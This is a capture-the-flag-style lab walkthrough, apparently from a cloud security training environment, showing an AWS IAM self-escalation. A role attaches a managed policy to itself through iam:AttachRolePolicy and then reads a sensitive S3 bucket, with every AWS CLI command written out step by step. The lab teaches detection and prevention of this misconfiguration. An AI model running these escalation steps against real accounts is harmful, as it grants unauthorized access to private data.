# Guided Walkthrough: Self-Escalation to S3 Bucket via iam:AttachRolePolicy

This scenario demonstrates a self-escalation technique where an IAM role abuses `iam:AttachRolePolicy` to attach a managed policy to itself, gaining access to a sensitive S3 bucket. The vulnerability arises when a role's policy grants `iam:AttachRolePolicy` scoped to its own ARN — a subtle misconfiguration that lets the role rewrite its own effective permissions at will.

In real environments, this pattern shows up when developers scope IAM permissions to "just the role itself" thinking that limits blast radius. But `iam:AttachRolePolicy` on self is one of the most powerful self-escalation primitives available: the role can attach any managed policy in the account, including policies granting broad data access.

Unlike cross-principal attacks, self-escalation paths are particularly difficult to detect in advance. Static policy analysis must recognize that the resource condition `arn:aws:iam::*:role/pl-prod-iam-009-to-bucket-starting-role` scoped to the role's own ARN is a self-modification capability — and that any self-modification capable of expanding permissions is a privilege escalation vector.

## The Challenge

You start with credentials for `pl-pathfinding-starting-user-prod`, an IAM user with minimal permissions. Your goal is to read data from the `pl-prod-iam-009-to-bucket-{account_id}` S3 bucket.

The path runs through `pl-prod-iam-009-to-bucket-starting-role`, which you can assume as the starting user. That role has `iam:AttachRolePolicy` scoped to its own ARN — and there is a managed policy (`pl-prod-iam-009-to-bucket-access-policy`) in the account that grants S3 access to the target bucket.

## Reconnaissance

First, confirm your identity and check what you can do from the starting user:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You are operating as `pl-prod-iam-009-to-bucket-starting-user`. Now check what roles are available to assume. The starting user's trust policy allows it to assume `pl-prod-iam-009-to-bucket-starting-role`.

Before assuming the role, try accessing the target bucket directly — it should fail:

```bash
aws s3 ls s3://pl-prod-iam-009-to-bucket-{account_id}/
# Expected: Access Denied
```

Now assume the starting role to get credentials with the `iam:AttachRolePolicy` permission:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-009-to-bucket-starting-role \
  --role-session-name recon-session
```

Export the returned temporary credentials. With those, check the role's current attached policies:

```bash
aws iam list-attached-role-policies \
  --role-name pl-prod-iam-009-to-bucket-starting-role
```

The role has no policies granting S3 access yet. Now look for managed policies in the account that could help:

```bash
aws iam list-policies --scope Local --query 'Policies[*].[PolicyName,Arn]' --output table
```

You should see `pl-prod-iam-009-to-bucket-access-policy`. That is your escalation target — attaching it to the role grants S3 access to the target bucket.

## Exploitation

With the role's temporary credentials active, attach the bucket access policy to the role:

```bash
aws iam attach-role-policy \
  --role-name pl-prod-iam-009-to-bucket-starting-role \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-009-to-bucket-access-policy
```

The call succeeds because the role's inline policy grants `iam:AttachRolePolicy` on its own ARN. Wait about 15 seconds for IAM policy propagation:

```bash
sleep 15
```

## Verification

Now attempt the S3 operations that were denied before escalation:

```bash
aws s3 ls s3://pl-prod-iam-009-to-bucket-{account_id}/
```

You should see `sensitive-data.txt` listed. Download it:

```bash
aws s3 cp s3://pl-prod-iam-009-to-bucket-{account_id}/sensitive-data.txt .
cat sensitive-data.txt
```

The download succeeds. You have read sensitive data from a bucket that was inaccessible when the attack started.

## What Happened

The attack chain was:

1. Starting user assumed `pl-prod-iam-009-to-bucket-starting-role` via `sts:AssumeRole`
2. That role used `iam:AttachRolePolicy` — scoped to its own ARN — to attach `pl-prod-iam-009-to-bucket-access-policy` to itself
3. With the new policy attached, the role's session could immediately list and read objects from the target S3 bucket

The root cause is granting `iam:AttachRolePolicy` with a resource condition pointing to the role itself. From an attacker's perspective, a role that can modify its own attached policies can grant itself any permission that any managed policy in the account can express — making the "scoped" resource condition effectively meaningless as a security control.

This class of vulnerability is precisely what IAM Access Analyzer's privilege escalation analysis is designed to surface. Any role with `iam:AttachRolePolicy` — even when scoped to a single ARN — should be reviewed to determine whether that ARN is the role itself.
